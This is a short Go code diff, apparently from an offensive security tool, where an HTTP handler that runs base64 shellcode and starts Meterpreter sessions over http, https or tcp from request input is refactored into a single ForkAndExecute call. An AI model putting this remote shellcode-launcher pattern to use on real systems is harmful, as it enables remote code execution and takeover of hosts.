@@ -8,9 +8,6 @@ import (
 	"log"
 	"net/http"
 	"net/url"
-
-	"github.com/kost/gosc/shell"
-	"github.com/kost/gosc/msf"
 )
 
 // CmdReq holds JSON input request.
@@ -108,20 +105,6 @@ func (cc *SCConfig) SCHandler(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	if ptype == "sc" {
-		go shell.ExecShellcode_b64(cmdstr)
-	}
-	if ptype == "msf-http" {
-		 go msf.Meterpreter("http", cmdstr)
-	}
-	if ptype == "msf-https" {
-		 go msf.Meterpreter("https", cmdstr)
-	}
-	if ptype == "msf-tcp" {
-		 go msf.Meterpreter("tcp", cmdstr)
-	}
-
-
-
+	go ForkAndExecute(cc,ptype,cmdstr)
 }
 
